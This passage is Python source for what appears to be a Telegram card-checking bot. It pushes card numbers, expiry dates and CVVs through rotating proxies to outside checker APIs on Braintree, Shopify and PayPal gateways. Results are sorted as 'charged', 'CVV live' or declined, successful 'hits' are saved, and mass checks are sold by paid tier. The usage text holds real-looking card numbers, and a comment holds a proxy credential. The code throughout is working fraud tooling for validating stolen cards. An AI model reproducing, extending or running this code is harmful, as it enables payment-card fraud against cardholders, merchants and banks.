        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "price": "$3.00",
        "bin": "N/A",
        "last4": "N/A",
        "card_display": card,
        "proxy_used": proxy,
        "retryable": False
    }
    
    try:
        # Fix proxy format
        formatted_proxy = None
        if proxy:
            formatted_proxy = fix_b3_proxy_format(proxy)
            print(f"🔧 Formatted proxy: {mask_proxy(formatted_proxy)}")
        
        # Build URL and params
        api_url = B3CHARGED_API_URL
        params = {'cc': card}
        if formatted_proxy:
            params['proxy'] = formatted_proxy
        
        print(f"📤 Request URL: {api_url}")
        
        start_time = time.time()
        
        async with httpx.AsyncClient(timeout=45.0, verify=False, follow_redirects=True) as client:
            response = await client.get(api_url, params=params)
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                status = data.get('status', 'ERROR')
                text = data.get('text', 'Unknown')
                price = data.get('price', '$3.00')
                bin_code = data.get('bin', 'N/A')
                last4 = data.get('last4', 'N/A')
                card_display = data.get('card', card)
                
                # ============ DETERMINE IF PROXY IS WORKING ============
                # These responses indicate the proxy is WORKING (card was checked)
                working_responses = ['APPROVED', 'DECLINED']
                # These responses indicate the proxy is DEAD
                dead_proxy_responses = [
                    'Failed to create account',
                    'Connection error',
                    'Timeout',
                    'Proxy error',
                    'Invalid proxy',
                    'Proxy authentication failed'
                ]
                
                is_proxy_working = status in working_responses
                is_proxy_dead = any(err in text for err in dead_proxy_responses)
                
                # Mark proxy as working or dead
                if user_id and proxy:
                    if is_proxy_working:
                        # Proxy is working - mark as success
                        if hasattr(proxy_manager, 'mark_proxy_success_for_user'):
                            proxy_manager.mark_proxy_success_for_user(user_id, proxy)
                            print(f"✅ Proxy marked as WORKING for user {user_id}")
                    elif is_proxy_dead and retry_count == 0:
                        # Proxy is dead - mark as failed and retry with new proxy
                        if hasattr(proxy_manager, 'mark_proxy_failure_for_user'):
                            proxy_manager.mark_proxy_failure_for_user(user_id, proxy)
                            print(f"❌ Proxy marked as DEAD for user {user_id}")
                        
                        # Retry with a different proxy
                        print(f"🔄 Retrying with a different proxy...")
                        new_proxy = get_working_proxy_for_b3(user_id, skip_proxy=proxy)
                        if new_proxy and new_proxy != proxy:
                            return await check_card_b3charged(card, new_proxy, user_id, retry_count + 1)
                        else:
                            print(f"⚠️ No alternative proxy available")
                
                # Map status
                if status == 'APPROVED':
                    status_display = "✅ APPROVED"
                    status_category = "approved"
                    if 'Insufficient Funds' in text:
                        status_display = "💰 INSUFFICIENT FUNDS"
                    elif 'CVV Mismatch' in text:
                        status_display = "✅ CVV LIVE"
                elif status == 'DECLINED':
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                else:
                    status_display = "⚠️ ERROR"
                    status_category = "error"
                
                return {
                    "status": "success" if status in ['APPROVED', 'DECLINED'] else "error",
                    "result": status,
                    "message": text,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "price": price,
                    "bin": bin_code,
                    "last4": last4,
                    "card_display": card_display,
                    "proxy_used": proxy,
                    "retryable": False
                }
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                default_result["message"] = "Invalid JSON response"
                default_result["elapsed"] = elapsed
                return default_result
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            default_result["message"] = f"HTTP Error: {response.status_code}"
            default_result["elapsed"] = elapsed
            return default_result
            
    except Exception as e:
        print(f"❌ Error: {e}")
        default_result["message"] = str(e)[:100]
        return default_result


def get_working_proxy_for_b3(user_id: int, skip_proxy: str = None) -> Optional[str]:
    """Get a working proxy for B3 gateway, skipping the failed one"""
    if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
        return None
    
    # Get failed proxies set
    failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
    
    # Get all available proxies
    available_proxies = []
    for proxy in proxy_manager.user_proxies[user_id]:
        if proxy not in failed_set and proxy != skip_proxy:
            available_proxies.append(proxy)
    
    # If all proxies are failed, reset and try all
    if not available_proxies:
        print(f"🔄 All proxies failed for user {user_id}, resetting failed list")
        proxy_manager.user_failed_proxies[user_id] = set()
        available_proxies = [p for p in proxy_manager.user_proxies[user_id] if p != skip_proxy]
    
    if not available_proxies:
        return None
    
    # Get next available proxy
    idx = proxy_manager.user_proxy_index.get(user_id, 0) % len(available_proxies)
    selected = available_proxies[idx]
    proxy_manager.user_proxy_index[user_id] = (proxy_manager.user_proxy_index.get(user_id, 0) + 1) % len(available_proxies)
    
    print(f"🔄 B3 using proxy: {mask_proxy(selected)}")
    return selected


def format_b3charged_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format B3CHARGED response for display - with None protection"""
    
    # Safety check - if result is None, create default
    if result is None:
        result = {
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "message": "No response from API",
            "price": "$3.00",
            "elapsed": 0,
            "proxy_used": "None",
            "bin": "N/A",
            "last4": "N/A"
        }
    
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    # Get values with safe defaults
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    price = result.get("price", "$3.00")
    elapsed = result.get("elapsed", 0)
    proxy_used = result.get("proxy_used", "None")
    bin_code = result.get("bin", "N/A")
    last4 = result.get("last4", "N/A")
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    # If we got real BIN info from API, use it
    if bin_code != "N/A" and bin_code != card[:6]:
        bin_display = f"{bin_info_text} [API BIN: {bin_code}]"
    else:
        bin_display = bin_info_text
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ B3Charged\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_display}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
    )
    
    # Add last4 if available
    if last4 != "N/A":
        ui += f"\n[⌬] 𝐋𝐚𝐬𝐭𝟒 ↣ {last4}"
    
    return ui, status_category


# ============ B3CHARGED SINGLE CHECK LOGIC ============
async def b3charged_single_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """Single check logic for B3CHARGED gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    

    
    try:
        # Check user access (add 'b3charged' to gateway access lists in UserManager)
        allowed, error_msg = await check_user_access(update, context, "b3charged")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        # Mark user as active
        b3charged_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        status_msg = await message.reply_text("🔄 Checking card with B3Charged ($3 Braintree)...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        
        # Make the API call
        result = await check_card_b3charged(card, proxy_str, u_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info (our local lookup, not from API)
        bin_info = await get_bin_info(card)
        
        # Format response (safe even if result is None)
        ui, status_category = format_b3charged_response(result, card, bin_info)
        
        # Send result
        await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if approved
        if status_category == "approved":
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="B3Charged",
                card=card,
                response=result.get("message", "Approved") if result else "Approved",
                price=result.get("price", "$3.00") if result else "$3.00",
                user=user_data,
                bin_info=bin_info,
                status_category=status_category
            )
            
            await save_hit_to_file(
                card=card,
                gateway="B3Charged",
                response=result.get("message", "Approved") if result else "Approved",
                price=result.get("price", "$3.00") if result else "$3.00",
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_manager.increment_hits(u_id)
        
        user_manager.increment_checks(u_id)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [B3Charged Single] Error: {traceback.format_exc()}")
    finally:
        # Remove from active tasks
        b3charged_active_tasks.pop(u_id, None)


# ============ B3CHARGED MASS CHECK LOGIC ============
async def b3charged_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for B3CHARGED gateway - only uses working proxies"""
    u_id = update.effective_user.id
    message = update.effective_message
    
    print(f"\n{'='*80}")
    print(f"🚀 [B3CHARGED MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {len(cards)}")
    print(f"{'='*80}")
    
    # Show proxy status at start
    if u_id in proxy_manager.user_proxies:
        total_proxies = len(proxy_manager.user_proxies[u_id])
        failed_proxies = len(proxy_manager.user_failed_proxies.get(u_id, set()))
        working_proxies = total_proxies - failed_proxies
        print(f"📊 Proxy Status: {working_proxies}/{total_proxies} working")
    
    try:
        b3charged_active_tasks[u_id] = True
        
        approved, declined, errors = 0, 0, 0
        total = len(cards)
        start_time_session = time.time()
        results_sent = 0
        
        allowed, error_msg = await check_user_access(update, context, "b3charged")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        if progress_msg is None:
            progress_msg = await message.reply_text(
                "🔄 Processing B3Charged cards...",
                parse_mode=ParseMode.HTML,
                reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
            )
        
        # Track which proxies are failing
        proxy_fail_count = {}
        
        for i, card in enumerate(cards, 1):
            if u_id not in b3charged_active_tasks:
                break
            
            await update_progress_buttons(
                context, message.chat_id, progress_msg.message_id,
                i-1, total, approved, declined,
                card, "Checking..."
            )
            
            await speed_controller.wait_if_needed()
            start = time.time()
            
            # Get a WORKING proxy only
            proxy_str = get_working_proxy_for_b3(u_id)
            
            result = await check_card_b3charged(card, proxy_str, u_id)
            
            elapsed = time.time() - start
            speed_controller.record_response(elapsed)
            
            # Track proxy failures
            if result and result.get('status_category') == 'error':
                if proxy_str:
                    proxy_fail_count[proxy_str] = proxy_fail_count.get(proxy_str, 0) + 1
                    # If proxy fails 3 times, mark as dead
                    if proxy_fail_count[proxy_str] >= 3:
                        if hasattr(proxy_manager, 'mark_proxy_failure_for_user'):
                            proxy_manager.mark_proxy_failure_for_user(u_id, proxy_str)
                            print(f"❌ Proxy {mask_proxy(proxy_str)} marked as DEAD after 3 failures")
            
            try:
                bin_info = await get_bin_info(card)
                ui, status_category = format_b3charged_response(result, card, bin_info)
            except Exception as e:
                print(f"❌ [B3Charged] Error formatting response: {e}")
                errors += 1
                continue
            
            if status_category == "approved":
                approved += 1
                
                await save_hit_to_file(
                    card=card,
                    gateway="B3Charged",
                    response=result.get("message", "Approved"),
                    price=result.get("price", "$3.00"),
                    bin_info=bin_info,
                    user_id=u_id,
                    user_tier=tier
                )
                
                # Send hit notification
                user_data = user_manager.get_user(u_id)
                await send_hit_notification(
                    context=context,
                    gateway="B3Charged",
                    card=card,
                    response=result.get("message", "Approved"),
                    price=result.get("price", "$3.00"),
                    user=user_data,
                    bin_info=bin_info,
                    status_category=status_category
                )
                
                try:
                    await asyncio.wait_for(
                        message.reply_text(ui, parse_mode=ParseMode.HTML),
                        timeout=10
                    )
                    results_sent += 1
                except Exception as e:
                    print(f"❌ [B3Charged] Error sending approved message: {e}")
                    
            elif status_category == "declined":
                declined += 1
            else:
                errors += 1
            
            user_manager.increment_checks(u_id, 1)
        
        # Send summary
        if u_id in b3charged_active_tasks:
            total_time = time.time() - start_time_session
            stats = speed_controller.get_stats()
            
            # Get final proxy stats
            if u_id in proxy_manager.user_proxies:
                total_proxies = len(proxy_manager.user_proxies[u_id])
                failed_proxies = len(proxy_manager.user_failed_proxies.get(u_id, set()))
                working_proxies = total_proxies - failed_proxies
                proxy_summary = f"\n🔌 Proxies: {working_proxies}/{total_proxies} working"
            else:
                proxy_summary = ""
            
            summary = (
                f"🏁 <b>B3Charged Session Finished</b>\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📝 Total: {total}\n"
                f"⚡ Speed: {stats['current_cph']:.0f}/{stats['target_cph']} cph\n"
                f"⏱️ Time: {int(total_time//60)}m {int(total_time%60)}s{proxy_summary}"
            )
            try:
                await message.reply_text(summary, parse_mode=ParseMode.HTML)
            except Exception as e:
                print(f"❌ [B3Charged] Error sending summary: {e}")
            
    except Exception as e:
        print(f"❌ [B3Charged] Error in mass check: {e}")
        traceback.print_exc()
        try:
            await message.reply_text(f"❌ Error in session: {str(e)[:100]}")
        except:
            pass
    finally:
        b3charged_active_tasks.pop(u_id, None)


# ============ B3CHARGED COMMAND HANDLERS ============
async def single_check_b3charged(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with B3CHARGED gateway"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "📦 <b>B3Charged Single Check</b>\n\n"
            "Usage: /b3 <card>\n"
            "Example: /b3 4111111111111111|12|2025|123\n\n"
            "This uses the BT3D API (Braintree $3 Checker)",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    card_text = " ".join(context.args).strip()
    card = card_formatter.extract_single_card_from_text(card_text)
    
    if not card:
        await update.message.reply_text(
            "❌ Invalid card format. Use: card|mm|yyyy|cvv\n"
            "Example: 4111111111111111|12|2025|123"
        )
        return
    
    await b3charged_single_check_logic(update, context, card)


async def mass_check_b3charged(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with B3CHARGED gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if not context.args:
        await update.message.reply_text(
            "📦 <b>B3Charged Mass Check</b>\n\n"
            "Usage: /mb3 <cards>\n"
            "Example: /mb3 4111111111111111|12|25|123 4222222222222222|11|24|456\n\n"
            "Or with line breaks:\n"
            "<code>/mb3 5185754261646119|01|34|081</code>\n"
            "<code>/mb3 4153670323274370|08|29|390</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check user access
    if not user_manager.can_access_gateway(user_id, 'b3charged'):
        await update.message.reply_text("❌ Your tier doesn't have access to B3Charged gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    

    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    # Start mass check
    asyncio.create_task(b3charged_mass_check_logic(update, context, cards))

# ============ NEW AUTOSOPI API CONFIGURATION ============
NEW_AUTOSOPI_API_BASE = "http://108.165.12.183:8081"
NEW_AUTOSOPI_API_ENDPOINT = f"{NEW_AUTOSOPI_API_BASE}/"

def format_proxy_for_new_autosopi(proxy: str) -> Optional[str]:
    """
    Format proxy for new Autosopi API
    Expected format: host:port:user:pass
    Example: gw.dataimpulse.com:823:b692468bee447f01d20d:019b8c03f5e0ee93
    """
    if not proxy:
        return None
    
    original_proxy = proxy
    
    try:
        # Remove any protocol prefixes
        proxy = re.sub(r'^(http|https|socks4|socks5)://', '', proxy)
        
        # Format 1: Already correct - host:port:user:pass
        parts = proxy.split(':')
        if len(parts) == 4:
            # Check if second part is port (digits) -> host:port:user:pass
            if parts[1].isdigit():
                print(f"✅ [New Autosopi] Using proxy as-is: {proxy}")
                return proxy
            else:
                # Format: user:pass:host:port - needs conversion
                user, password, host, port = parts
                if port.isdigit():
                    result = f"{host}:{port}:{user}:{password}"
                    print(f"✅ [New Autosopi] Converted user:pass:host:port -> {result}")
                    return result
        
        # Format 2: user:pass@host:port
        if '@' in proxy:
            auth, hostport = proxy.split('@', 1)
            if ':' in auth and ':' in hostport:
                user, password = auth.split(':', 1)
                host, port = hostport.split(':', 1)
                result = f"{host}:{port}:{user}:{password}"
                print(f"✅ [New Autosopi] Converted @ format -> {result}")
                return result
        
        # Format 3: host:port only (no authentication)
        if len(parts) == 2 and parts[1].isdigit():
            print(f"⚠️ [New Autosopi] Proxy without auth: {proxy}")
            return proxy
        
        print(f"⚠️ [New Autosopi] Could not parse: {original_proxy[:50]}...")
        return None
        
    except Exception as e:
        print(f"⚠️ [New Autosopi] Error parsing proxy: {e}")
        return None


async def check_card_new_autosopi(card: str, site: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
    """
    Check card using new Autosopi API with proper error handling
    """
    print(f"\n{'='*80}")
    print(f"💳 [NEW AUTOSOPI API] Checking card: {card[:20]}...")
    print(f"📍 Site: {site}")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    if retry_count > 0:
        print(f"🔄 RETRY ATTEMPT #{retry_count}")
    print(f"{'='*80}")
    
    # Default result in case of any failure
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "price": "0.00",
        "gateway": "Shopify Payments"
    }
    
    try:
        # Parse card for validation
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, month, year, cvv = parts
        
        # Format year to 2 digits for API
        if len(year) == 4:
            year_2digit = year[2:]
        else:
            year_2digit = year
        
        # Format card for API
        formatted_card = f"{card_num}|{month}|{year_2digit}|{cvv}"
        
        # Keep the full URL with protocol
        if not site.startswith(('http://', 'https://')):
            site_clean = f"https://{site}"
        else:
            site_clean = site
        
        print(f"🔗 Cleaned URL: {site_clean}")
        
        # Prepare parameters
        params = {
            "cc": formatted_card,
            "url": site_clean
        }
        
        # Format proxy for this API
        proxy_param = None
        if proxy:
            proxy_param = format_proxy_for_new_autosopi(proxy)
            if proxy_param:
                params["proxy"] = proxy_param
                print(f"🔍 [NEW AUTOSOPI] Using proxy: {mask_proxy(proxy_param)}")
        
        start_time = time.time()
        
        # Set timeout based on retry
        if retry_count == 0:
            timeout_seconds = 45.0
        else:
            timeout_seconds = 55.0
        
        # Initialize response variable BEFORE the try block
        response = None
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(timeout_seconds, connect=15.0, read=timeout_seconds - 10), 
            verify=False,
            limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)
        ) as client:
            response = await client.get(
                NEW_AUTOSOPI_API_ENDPOINT,
                params=params,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json",
                    "Connection": "close"
                },
                follow_redirects=True
            )
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s")
        
        # Check if response exists
        if response is None:
            print(f"❌ No response received")
            default_result["message"] = "No response received"
            default_result["elapsed"] = elapsed
            return default_result
        
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            # Check for empty response
            response_text_raw = response.text.strip()
            
            if not response_text_raw:
                print(f"⚠️ Empty response from API for site {site}")
                if retry_count == 0:
                    print(f"🔄 Empty response - retrying...")
                    await asyncio.sleep(2)
                    return await check_card_new_autosopi(card, site, proxy, user_id, retry_count=1)
                
                default_result["message"] = "Empty response from API"
                default_result["elapsed"] = elapsed
                return default_result
            
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                # Extract response data
                response_text = data.get("Response", data.get("message", data.get("status", "UNKNOWN")))
                gateway = data.get("Gate", data.get("gateway", "Shopify Payments"))
                price = data.get("Price", data.get("amount", "0.00"))
                
                response_upper = response_text.upper()
                
                # ============ RESPONSE MAPPING ============
                charged_patterns = ["CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED", "APPROVED", "ORDER_PLACED"]
                live_patterns = ["INSUFFICIENT", "FUNDS", "INSUFFICIENT_FUNDS", "CVV LIVE", "INCORRECT_CVV", "CVV_MISMATCH"]
                otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS", "OTP_REQUIRED", "3D_SECURE"]
                decline_patterns = ["CARD_DECLINED", "DECLINED", "REJECTED", "DO NOT HONOR", "GENERIC_ERROR", "INVALID CARD"]
                site_error_patterns = ["INVALID SITE URL", "SITE NOT FOUND", "SITE DEAD", "CONNECTION REFUSED"]
                
                if any(p in response_upper for p in site_error_patterns):
                    status_display = "⚠️ SITE ERROR"
                    status_category = "site_error"
                    print(f"⚠️ Site error for {site_clean}: {response_text}")
                    
                elif any(p in response_upper for p in charged_patterns):
                    status_display = "🔥 CHARGED 🔥"
                    status_category = "charged"
                    
                elif any(p in response_upper for p in live_patterns):
                    if "INSUFFICIENT" in response_upper:
                        status_display = "💰 INSUFFICIENT FUNDS"
                    else:
                        status_display = "✅ CVV LIVE"
                    status_category = "approved"
                    
                elif any(p in response_upper for p in otp_patterns):
                    status_display = "🔐 3D REQUIRED"
                    status_category = "approved"
                    
                elif any(p in response_upper for p in decline_patterns):
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                    
                else:
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                
                return {
                    "status": "success" if status_category in ["charged", "approved"] else "declined",
                    "result": response_text,
                    "message": response_text,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "price": price,
                    "gateway": gateway,
                    "site": site_clean,
                    "proxy_used": proxy,
                    "api_used": "new_autosopi",
                    "retry_count": retry_count
                }
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                print(f"📄 Raw response: {response_text_raw[:200]}")
                
                # Check if it's a curl error response
                if "Failed to perform" in response_text_raw or "curl:" in response_text_raw:
                    if retry_count < 2:
                        print(f"🔄 Proxy error - retrying with different proxy...")
                        await asyncio.sleep(2)
                        return await check_card_new_autosopi(card, site, proxy, user_id, retry_count + 1)
                    
                    default_result["message"] = response_text_raw[:100]
                    default_result["status_display"] = "⚠️ PROXY ERROR"
                    default_result["elapsed"] = elapsed
                    return default_result
                
                if retry_count == 0:
                    print(f"🔄 JSON error - retrying...")
                    await asyncio.sleep(2)
                    return await check_card_new_autosopi(card, site, proxy, user_id, retry_count=1)
                
                default_result["message"] = "Invalid JSON response"
                default_result["elapsed"] = elapsed
                return default_result
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            
            # Retry on server errors
            if response.status_code in [408, 429, 500, 502, 503, 504] and retry_count == 0:
                print(f"🔄 HTTP {response.status_code} - retrying...")
                await asyncio.sleep(2)
                return await check_card_new_autosopi(card, site, proxy, user_id, retry_count=1)
            
            default_result["message"] = f"HTTP Error: {response.status_code}"
            default_result["elapsed"] = elapsed
            return default_result
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error")
        if retry_count < 2:
            print(f"🔄 Timeout - retrying with longer timeout...")
            await asyncio.sleep(2)
            return await check_card_new_autosopi(card, site, proxy, user_id, retry_count + 1)
        default_result["message"] = f"Request timeout after {timeout_seconds}s"
        return default_result
        
    except Exception as e:
        print(f"❌ Error: {e}")
        print(f"📝 Traceback: {traceback.format_exc()}")
        if retry_count < 2:
            print(f"🔄 Exception - retrying...")
            await asyncio.sleep(2)
            return await check_card_new_autosopi(card, site, proxy, user_id, retry_count + 1)
        default_result["message"] = str(e)[:100]
        return default_result


async def fast_check_card(card: str, site: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
    """
    Fast card check - uses NEW Autosopi API
    """
    try:
        result = await check_card_new_autosopi(card, site, proxy, user_id)
        
        if result and result.get("status") != "error":
            return {
                "success": True,
                "Response": result.get("message", "UNKNOWN"),
                "Gateway": result.get("gateway", "Shopify Payments"),
                "Price": result.get("price", "0.00"),
                "status_display": result.get("status_display", "❌ DECLINED"),
                "status_category": result.get("status_category", "declined"),
                "api_used": "new_autosopi",
                "elapsed": result.get("elapsed", 0)
            }
        else:
            return {"success": False, "error": result.get("message", "Unknown error") if result else "No response", "card": card}
        
    except Exception as e:
        print(f"❌ [fast_check] Error: {e}")
        return {"success": False, "error": str(e)[:50], "card": card}
    
async def try_autoshopify_api(card: str, site_url: str, formatted_card: str, proxy: str = None, user_id: int = None) -> Tuple[Optional[Dict], Optional[str]]:
    """
    Main Autoshopify API - uses check_card_new_autosopi
    """
    try:
        result = await check_card_new_autosopi(card, site_url, proxy, user_id)
        
        if result and result.get("status") != "error":
            return {
                "success": True,
                "Response": result.get("message", "UNKNOWN"),
                "Gateway": result.get("gateway", "Shopify Payments"),
                "Price": result.get("price", "0.00"),
                "api_used": "main_autoshopify",
                "elapsed": result.get("elapsed", 0)
            }, None
        else:
            return None, result.get("message", "Unknown error") if result else "No response"
            
    except Exception as e:
        return None, str(e)[:50]


async def try_backup_shopify_api(card: str, site_url: str, formatted_card: str, proxy: str = None) -> Tuple[Optional[Dict], Optional[str]]:
    """
    Backup API - falls back to PayPal API
    """
    try:
        # Parse card for backup API
        parts = card.split('|')
        if len(parts) == 4:
            card_num, month, year, cvv = parts
            if len(year) == 4:
                year_2digit = year[2:]
            else:
                year_2digit = year
            backup_card = f"{card_num}|{month}|{year_2digit}|{cvv}"
        else:
            backup_card = card
        
        # Use PayPal API as backup
        amount = "1.00"
        currency = "USD"
        
        result = await check_card_paypal(backup_card, amount, currency, proxy, None)
        
        if result:
            response_msg = result.get("message", "UNKNOWN")
            status_category = result.get("status_category", "unknown")
            
            # Map status
            if status_category == "charged":
                response_text = "CHARGED"
            elif status_category == "approved":
                if "INSUFFICIENT" in response_msg.upper():
                    response_text = "INSUFFICIENT FUNDS"
                else:
                    response_text = "CVV LIVE"
            else:
                response_text = "CARD DECLINED"
            
            return {
                "success": True,
                "Response": response_text,
                "Gateway": "Shopify Payments",
                "Price": amount,
                "api_used": "backup_paypal",
                "elapsed": result.get("elapsed", 0)
            }, None
        else:
            return None, "Backup API failed"
            
    except Exception as e:
        return None, str(e)[:50]


async def try_shopify_mass_api(card: str, site_url: str, formatted_card: str, proxy: str = None) -> Tuple[Optional[Dict], Optional[str]]:
    """
    2nd Backup API - uses the same new Autosopi API
    """
    # Same as try_autoshopify_api for now
    return await try_autoshopify_api(card, site_url, formatted_card, proxy)
# ============ SINGLE CHECK FUNCTIONS FOR AUTOSOPI ============

async def single_check_autosopi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Autosopi"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "📦 <b>Autosopi Single Check</b>\n\n"
            "Usage: <code>/auc &lt;card&gt;</code>\n"
            "Example: <code>/auc 5039895700069328|03|2033|292</code>\n\n"
            "Supported formats:\n"
            "• <code>number|month|year|cvv</code>\n"
            "• <code>number month year cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    
    # Check if user has access (for private chats)
    chat = update.effective_chat
    if chat.type == 'private':
        if not user_manager.can_access_gateway(user_id, 'autosopi'):
            await update.message.reply_text(
                "❌ <b>Private Chat Requires Paid Tier</b>\n\n"
                "Join our group for free checking or upgrade to Premium/Ultimate.",
                parse_mode=ParseMode.HTML
            )
            return
    
    card_text = " ".join(context.args).strip()
    card = card_formatter.extract_single_card_from_text(card_text)
    
    if not card:
        await update.message.reply_text(
            "❌ Invalid card format. Use: card|month|year|cvv\n"
            "Example: 5039895700069328|03|2033|292"
        )
        return
    
    await autosopi_single_check_logic(update, context, card)


async def mass_check_autosopi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with new Autosopi API - /aumc <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check if this is a reply to a file
    if update.message.reply_to_message:
        user_id_reply = update.effective_user.id
        reply_to_msg_id = update.message.reply_to_message.message_id
        
        if user_id_reply in pending_files and pending_files[user_id_reply].get('message_id') == reply_to_msg_id:
            file_data = pending_files.pop(user_id_reply)
            cards = file_data['cards']
            
            if not user_manager.can_access_gateway(user_id, 'autosopi'):
                await message.reply_text("❌ Your tier doesn't have access to Autosopi gateway.")
                return
            
            await autosopi_mass_check_logic(update, context, cards)
            return
    
    if not context.args:
        await message.reply_text(
            "📦 <b>New Autosopi Mass Check</b>\n\n"
            "Usage: <code>/aumc &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
            "Examples:\n"
